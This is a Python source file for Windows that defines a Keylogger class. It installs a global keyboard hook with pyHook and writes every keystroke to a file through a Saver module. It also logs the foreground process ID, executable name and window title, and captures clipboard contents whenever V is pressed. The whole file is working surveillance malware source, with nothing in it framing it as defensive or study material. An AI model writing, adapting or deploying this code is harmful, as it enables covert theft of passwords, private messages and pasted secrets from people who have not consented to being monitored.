#!/usr/bin/python

from ctypes import *
import pythoncom
import pyHook
import win32clipboard
from saver import Saver
import time


class Keylogger():
    def __init__(self):
        self.saver = Saver()
        self.user32 = windll.user32
        self.krl32 = windll.kernel32
        self.psapi = windll.psapi
        self.current_windows = None
        self.current_time = None

    def get_current_process(self):
        pid = c_long(0)

        hwnd = self.user32.GetForegroundWindow()
        self.user32.GetWindowThreadProcessId(hwnd,byref(pid))
        process_id = "%d" % pid.value

        executable = create_string_buffer("\x00"*512)
        h_process = self.krl32.OpenProcess(0x400 | 0x10, False, pid)

        self.psapi.GetModuleBaseNameA(h_process,None,byref(executable),512)
        windows_title = create_string_buffer("\x00"*512)
        lenght = self.user32.GetWindowTextA(hwnd,byref(windows_title),512)

        #Save PID to file
        a= "\n[*] PID: %s - %s - %s [*]\n" %(process_id,executable.value,windows_title.value)
        self.saver.write_to_file(a)


        self.krl32.CloseHandle(hwnd)
        self.krl32.CloseHandle(h_process)

    def keystroke(self,event):
        if event.WindowName != self.current_windows:
            self.current_windows = event.WindowName
            self.get_current_process()

        if event.Ascii > 32 and event.Ascii < 127:
            #write to file
            a = (" ".join(chr(event.Ascii)))
            self.saver.write_to_file(a)
        else:
            if event.Key == "V":
                win32clipboard.OpenClipboard()
                pasted = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                #write to file
                a =(" [Wklejono:] %s " % pasted)
                self.saver.write_to_file(a)
            else:
                #write to file
                a= ("%s " % event.Key)
                self.saver.write_to_file(a)
        return True

    def keylogger(self):
        self.saver.set_current_time()
        k = pyHook.HookManager()
        k.KeyDown = self.keystroke
        k.HookKeyboard()
        pythoncom.PumpMessages()
